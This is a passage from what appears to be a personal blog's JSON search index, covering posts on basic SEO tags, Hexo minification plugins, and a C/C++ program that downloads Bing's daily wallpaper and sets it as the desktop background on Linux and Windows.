    "tags": "blogging, hexo, seo",
    "date": "2020-12-25 00:00:00 +0900",
    





    
    "snippet": "What‚Äôs SEO‚Äã\tAn SEO (‚ÄúSearch Engine Optimization‚Äù) expert is someone trained to improve your visibility on search engines. So, it‚Äôs important to learn about SEO.Title‚Äã\tWhat is a page title? This is ...",
    "content": "What‚Äôs SEO‚Äã\tAn SEO (‚ÄúSearch Engine Optimization‚Äù) expert is someone trained to improve your visibility on search engines. So, it‚Äôs important to learn about SEO.Title‚Äã\tWhat is a page title? This is the HTML title tag, which we also call the page title. The page title is the most influential place to have your keyword phrase. Must make sure a title is good enough. Here are some recommendations for you:  Length: Between 50 - 60 characters, make it ‚Äúsimple‚Äù, remember do not make it too long.  DO NOT overdo keywords in title like: ‚ÄúTitle TITLE title‚Ä¶‚Äù. That‚Äôs really not a good idea‚Ä¶  Unique title: don‚Äôt use same titles‚Ä¶ You know‚Ä¶                              Separate keywords with ‚Äú - ‚Äú, ‚Äú **          ** ‚Äú‚Ä¶                    Keywords Tag‚Äã\tYou can put keywords into a keywords tag in &lt;head&gt;&lt;/head&gt; like this:&lt;head&gt;\t&lt;meta name=\"keywords\" content=\"Keywords, blog, SEO\"&gt;&lt;/head&gt;ALSO:  DO NOT overdo keywords!!!Descriptions Tag‚Äã\tA description tag contains the‚Ä¶ descriptionüòÖ. All right, search engines may use the description provided in the description tag in the search engine results page (SERP). A well-written description that pertains to the content of the  page and that is relevant to the searcher‚Äôs intent can help you increase traffic since it can help improve the click-through rate of your page  in search. Add a description to the &lt;head&gt;&lt;/head&gt; section of the page source:&lt;head&gt;\t&lt;meta name='description' content='Descriptive, Now we talk about the basics of Search Engine Optimization.'&gt;&lt;/head&gt;Heading Tag‚Äã\tHeading is the collective name for the 6 tags: h1, h2, h3, h4, h5, and h6. The weights of the 6 tags are from big to small, that is, h1 is the big heading, h6 is the smallest heading:&lt;h1&gt;Heading 1&lt;/h1&gt;‚Äã\tThe h1 tag can only be used once. If it is used multiple times, it is easy to be regarded as cheating by search engines.No follow‚Äã\tThe nofollow tag tells search engines to ignore that link. Because  nofollow links do not pass PageRank they likely don‚Äôt impact search  engine rankings. Nofollow links are links with a rel=‚Äùnofollow‚Äù HTML tag applied to them:&lt;a href = \"https://theodorecooper.github.io/\" rel = \"nofollow\"&gt;Sitemap  ‚Äã\tA sitemap is a file where you provide information about the  pages, videos, and other files on your site, and the relationships  between them. Search engines like Google read this file to more  intelligently crawl your site. A sitemap tells Google which pages and  files you think are important in your site, and also provides valuable  information about these files: for example, for pages, when the page was last updated, how often the page is changed, and any alternate language versions of a page.Sitemaps (XML) look like this:&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\"&gt;\t&lt;url&gt;\t\t&lt;loc&gt;https://theodorecooper.github.io/&lt;/loc&gt;\t\t&lt;lastmod&gt;2020-10-31T16:12:20+03:00&lt;/lastmod&gt;\t&lt;/url&gt;&lt;/urlset&gt;‚Äã\tOf course, there are HTML sitemaps, even TXT sitemaps‚Ä¶How to get a sitemap?  Write it yourself (if you are a complete fool)  Use plugins (like Yoast‚Ä¶)  Use sitemap generators:          XML - Sitemaps      My Sitemap Generator      ‚Ä¶      robots.txt  ‚Äã\tA robots.txt file tells search engine crawlers which pages or files the crawler can or            can‚Äôt request from your site. This is used mainly to avoid overloading your site with            requests.robots.txt looks like this:User-agent: *Allow: /Allow: /archives/Allow: /categories/Allow: /tags/ Allow: /resources/ Disallow: /vendors/Disallow: /js/Disallow: /css/Disallow: /fonts/Disallow: /vendors/Sitemap: ...‚Äã\tThe value of Allow is the content that allows search engines to crawl the area.Link structure‚Äã\tThe distance between the home page and other pages cannot be too large, it means: keep your URL short.‚Äã\tDO NOThttps://theodorecooper.github.io/blog/2020/12/25/seo/index.html‚Äã\tDOhttps://theodorecooper.github.io/2020/seo/index.html‚Äã\tIn a word: SIMPLE.Image ALT‚Äã\tWhen inserting a picture, you will be prompted to enter text. The keywords appearing in the image ALT also have a certain impact on page relevance. Similarly, DO NOT overdo keywords!!!More‚Ä¶  Google Search Console  Bing Webmaster Tools  Google Analytics  Do not use hack tools‚Ä¶  Be patient!  Think carefully!"
  },
  
  {
    "title": "Hexo | Speed up",
    "url": "/posts/hexo-speed-up/",
    "categories": "",
    "tags": "",
    "date": "2020-12-18 00:00:00 +0900",
    





    
    "snippet": "use plugins      Compress HTML code:    npm install hexo-html-minifier --save            Compress JavaScript code:    npm install hexo-uglify --save            Compress CSS code:    npm install hex...",
    "content": "use plugins      Compress HTML code:    npm install hexo-html-minifier --save            Compress JavaScript code:    npm install hexo-uglify --save            Compress CSS code:    npm install hexo-clean-css --save      ## result‚Ä¶"
  },
  
  {
    "title": "Linux, C | Bing Backgrounds Getter",
    "url": "/posts/linux-bingbg/",
    "categories": "C/C++, Linux",
    "tags": "C/C++, Linux",
    "date": "2020-11-29 00:00:00 +0900",
    





    
    "snippet": "Linux, Bing‚Ä¶‚Äã\tIt‚Äôs a program written by C, it will automatically download and set wallpaper for you on Linux!How does it works‚Äã\tIt will download a XML file contains the API of www.bing.com, and the...",
    "content": "Linux, Bing‚Ä¶‚Äã\tIt‚Äôs a program written by C, it will automatically download and set wallpaper for you on Linux!How does it works‚Äã\tIt will download a XML file contains the API of www.bing.com, and then, I parse the file to obtain the full URL-path of the daily wallpaper. Finally, the wallpaper will be download and set as the background.DetailsDevelopment environment:      Linux 5.7.0\tamd64\tx86_64        MATE 1.24.0        gcc version 9.3.0 (Debian 9.3.0-15)        curl 7.72.0 (x86_64-pc-linux-gnu)        libxml2        vim  ‚Äã\tSo, how Linux download files with C? There‚Äôs no URLDownloadToFile(), but we have a stronger tool ‚Äì curl. After installing the libcurl package for C, we can use it to download the files.Install libcurl:  $ sudo apt-get update   $ sudo apt-get install curl   $ sudo apt-get install libcurl4-openssl-devDownload with curl:  /*  *#include &lt;curl/curl.h&gt;  *remember this!!!  */    curlXml = curl_easy_init();  if (curlXml)  {      fpXml = fopen(xmlName, \"wb\");      curl_easy_setopt(curlXml, CURLOPT_URL, xml_url);      curl_easy_setopt(curlXml, CURLOPT_WRITEFUNCTION, write_data);      curl_easy_setopt(curlXml, CURLOPT_WRITEDATA, fpXml);      curl_easy_setopt (curlXml, CURLOPT_NOPROGRESS, 0);        resXml = curl_easy_perform(curlXml);      curl_easy_cleanup(curlXml);      fclose(fpXml);  }‚Äã\tAfter it, another big problem, how to parse the XML? I tried tinyxml, but such foolish thing even can hardly be installed on my lovely Linux! Then I find another easier way, libxml. With the help of APT, I easily installed libxml, next I learned how to use it.Install libxml:  $ sudo apt-get install libxml2  $ sudo apt-get install libxml2-devHere‚Äôs the example:  /*  *#include &lt;libxml/tree.h&gt;  *#include &lt;libxml/parser.h&gt;  *remember this!!!  */    xmlDocPtr pdoc = NULL;  xmlNodePtr proot = NULL;  xmlNodePtr pcur = NULL;      xmlKeepBlanksDefault(0); //Blanks may be parse as a node  pdoc = xmlReadFile(xmlName, \"UTF-8\", XML_PARSE_RECOVER);    if (pdoc == NULL)  {      printf(RED\"ERROR:cannot open xml!!!\\n\");     \texit(1);  }    proot = xmlDocGetRootElement(pdoc);    if(proot == NULL)  {      printf(RED\"ERROR: Xml is empty!!!\\n\");     \texit(1);  }    pcur = proot -&gt; xmlChildrenNode;    while (pcur != NULL)  {      if (!xmlStrcmp(pcur-&gt;name, BAD_CAST(\"image\")))      {          xmlNodePtr nptr=pcur-&gt;xmlChildrenNode;        \twhile (pcur != NULL)        \t{              if (!xmlStrcmp(nptr-&gt;name, BAD_CAST(\"url\")))              {                 \t\turlPart = XML_GET_CONTENT(nptr-&gt;xmlChildrenNode);          \t\tprintf(\"URL part: %s\", urlPart);          \t\tbreak;              }          \tnptr = nptr -&gt; next;          }      }      pcur = pcur -&gt; next;  }    xmlFreeDoc(pdoc);  xmlCleanupParser();  xmlMemoryDump();  printf(\"&lt;Parse Done!!!&gt;\\n\");‚Äã\tcurl again!!! The wallpaper successfully downloaded!!!## Finally, how to set wallpapers‚Ä¶‚Äã\tI promise, I won‚Äôt let you set backgrounds like that, you won‚Äôt need to open your control center - Look and Feel - Appearance. We use gsettings.  gsettings set org.mate.background picture-filename picUri‚Äã\tGnome 3 is supported too:  gsettings set org.gnome.desktop.background picture-uri picUri### It support:  Gnome 3 test on latest Ubuntu (ubuntu-20.04.1-desktop-amd64)  MATE test on Debian 10  Xfce isn‚Äôt supported now  You can just store the wallpaper, if you don‚Äôt want to change your backgrounds## Source code      You can find the source code on my Github.        --- ~~Star &amp; Fork me~~ ---        Give me advice: ccooperr2005@gmail.com        Donate (Bitcoin) :    zpub6maNAHkLN2gfztxLDnKVjJASMk1Ra5DgdF2yGSTov7VXUn3Eijusyye89aKSwZWxrRas4QJnVtwXKEzdpKhTMSgiXF9RuK6AMm6w3V4jnMr    : )  ### Compile &amp; Build the code  $ git clone https://github.com/theodorecooper/Linux-Bing-Backgrounds-Getter.git  $ cd Linux-Bing-Backgrounds-Getter  $ make  $ ./bingbg"
  },
  
  {
    "title": "Windows, C++ | Bing Backgrounds Getter",
    "url": "/posts/bing-backgrounds/",
    "categories": "C/C++, Qt",
    "tags": "c, c++, qt, windows",
    "date": "2020-11-28 20:33:00 +0900",
    





    
    "snippet": "Wallpapers, Bing‚Ä¶‚Äã\tHave you ever tried to download wallpapers from www.bing.com? Have you ever dreamed of a fantastic background but feel bored with download wallpapers by hands! It‚Äôs a program wri...",
    "content": "Wallpapers, Bing‚Ä¶‚Äã\tHave you ever tried to download wallpapers from www.bing.com? Have you ever dreamed of a fantastic background but feel bored with download wallpapers by hands! It‚Äôs a program written by C++, it will automatically download and set wallpaper for you!How does it works‚Äã\tIt will download a XML file contains the API of www.bing.com, and then, I use tinyxml to parse the file to obtain the full URL-path of the daily wallpaper. Finally, the wallpaper will be download and set as the background.DetailsPlatform:  Windows 7  Visual Studio 2019(Preview)  Old damn computer &amp; sh*t mouse &amp; dusty keyboard‚Äã\tWhat‚Äôs the local of the wallpaper? After Googling, I get this: ‚Äúhttps://www.bing.com/HPImageArchive.aspx?format=xml&amp;idx=0&amp;n=1&amp;mkt=en-US‚Äù. That‚Äôs important, the full URL is contained in this file. Take a look at the label &lt;image&gt;&lt;url&gt;&lt;/url&gt;&lt;/image&gt;, it‚Äôs the part of the full path, just cat \"www.bing.com\" with it, you will obtain the full path.‚Äã\tSo, we should download the XML and try to parse it. We require URLDownloadToFile() to download remote files:string xml_url = \"https://cn.bing.com/HPImageArchive.aspx?format=xml&amp;idx=0&amp;n=1\";size_t len = xml_url.length();int nmlen = MultiByteToWideChar(CP_ACP, 0, xml_url.c_str(), len + 1, NULL, 0);wchar_t* buffer = new wchar_t[nmlen];MultiByteToWideChar(CP_ACP, 0, xml_url.c_str(), len + 1, buffer, nmlen);HRESULT hr = URLDownloadToFile(NULL, buffer, _T(\"C:\\\\Program Files\\\\The0d0re C00per\\\\Bing Backgrouds\\\\XML\\\\INDEX.xml\"), 0, NULL);if (hr == S_OK){    cout &lt;&lt; \"Download XML -----------------&gt; DONE\" &lt;&lt; endl;    get_pic_url();}else{    std::cout &lt;&lt; \"Xml download failed!Please check whether the network connection is normal!\" &lt;&lt; std::endl;    MessageBoxA(NULL, \"Xml download failed!Please check whether the network connection is normal!\", \"WARNING!\", MB_OK);}‚Äã‚Äã\tNext, the program should know where &lt;image&gt;&lt;url&gt;&lt;/url&gt;&lt;/image&gt; is and what‚Äôs in this label. I use tinyxml to make it (more about tinyxml).TiXmlDocument doc;const char* xmlFile = \"C:\\\\Program Files\\\\The0d0re C00per\\\\Bing Backgrouds\\\\XML\\\\INDEX.xml\";if (doc.LoadFile(xmlFile)){\tcout &lt;&lt; \"Load file -----------------&gt; DONE\" &lt;&lt; endl;}else {    cout &lt;&lt; \"Can not parse xml!!\" &lt;&lt; endl;    MessageBoxA(NULL, \"Can not parse xml!! Please restart the program and try again!!\", \"WARNING!\", MB_OK);}TiXmlElement* images = doc.RootElement();TiXmlElement* image = images-&gt;FirstChildElement(\"image\");string WebPicturedomain = \"http://www.bing.com\";string WebPictureUrl = \"\";if (image != NULL)    WebPictureUrl = image-&gt;FirstChildElement(\"url\")-&gt;GetText();string WebPictureFullpath = WebPicturedomain + WebPictureUrl;cout &lt;&lt; \"Today Wallpaper Url Successful analysis!\" &lt;&lt; std::endl;cout &lt;&lt; \"The address is:\" &lt;&lt; std::endl;cout &lt;&lt; WebPictureFullpath &lt;&lt; std::endl;‚Äã‚Äã\tURLDownloadToFile() again to download the wallpaper‚Ä¶string pic_url = WebPictureFullpath;size_t len0 = pic_url.length();int nmlen0 = MultiByteToWideChar(CP_ACP, 0, pic_url.c_str(), len0 + 1, NULL, 0);wchar_t* buffer0 = new wchar_t[nmlen0];MultiByteToWideChar(CP_ACP, 0, pic_url.c_str(), len0 + 1, buffer0, nmlen0);HRESULT hr0 = URLDownloadToFile(NULL, buffer0, _T(\"C:\\\\Program Files\\\\The0d0re C00per\\\\Bing Backgrouds\\\\PIC\\\\Today Wallpaper.png\"), 0, NULL);if (hr0 == S_OK){    cout &lt;&lt; \"Wallpaper Successfully Download!!!\" &lt;&lt; std::endl;}else{    std::cout &lt;&lt; \"Wallpaper download failed!Please check whether the network connection is normal!\" &lt;&lt; std::endl;    MessageBoxA(NULL, \"Wallpaper download failed!Please check whether the network connection is normal!\", \"WARNING!\", MB_OK);}Finally, it‚Äôs time to set wallpaper as the background!!! I wrote a function:int ApplyWallpaper(const char* szFileDir, int displayStyle){    WCHAR wsz[MAX_PATH];    MultiByteToWideChar(        CP_ACP,        0,        szFileDir,        -1,        wsz,        MAX_PATH    );    CoInitialize(NULL);    std::wstring x = wsz;    DWORD dwStyle = displayStyle;    HRESULT hr;    IActiveDesktop* pIAD;    hr = CoCreateInstance(CLSID_ActiveDesktop, NULL, CLSCTX_INPROC_SERVER,        IID_IActiveDesktop, (void**)&amp;pIAD);    if (!SUCCEEDED(hr))    {        int errNum = GetLastError();        return errNum;    }    hr = pIAD-&gt;SetWallpaper(x.c_str(), 0);    if (!SUCCEEDED(hr))    {        int errNum = GetLastError();        return errNum;    }        WALLPAPEROPT wpo;    wpo.dwSize = sizeof(wpo);    wpo.dwStyle = dwStyle;    hr = pIAD-&gt;SetWallpaperOptions(&amp;wpo, 0);    if (!SUCCEEDED(hr))    {        int errNum = GetLastError();        return errNum;    }        hr = pIAD-&gt;ApplyChanges(AD_APPLY_ALL);        if (!SUCCEEDED(hr))    {        int errNum = GetLastError();        return errNum;    }        pIAD-&gt;Release();    CoUninitialize();        return TRUE;}/*if (ApplyWallpaper(\"C:\\\\Program Files\\\\The0d0re C00per\\\\Bing Backgrouds\\\\PIC\\\\Today Wallpaper.png\", 0)){\tstd::cout &lt;&lt; \"Wallpaper Set!!\" &lt;&lt; std::endl;    MessageBoxA(NULL, \"Wallpaper Set!!\", \"Bing Backgrounds Getter\", MB_OK);}else{\tstd::cout &lt;&lt; \"Failed to Set Wallpaper!!\" &lt;&lt; std::endl;    MessageBoxA(NULL, \"Failed to Set Wallpaper!!\", \"WARNING!\", MB_OK);}*/Source code  You can find the source code or installer on my Github.Linux‚Ä¶‚Äî‚Äî‚Äî‚Äî‚ÄîComing soon‚Ä¶"
  }
  
]

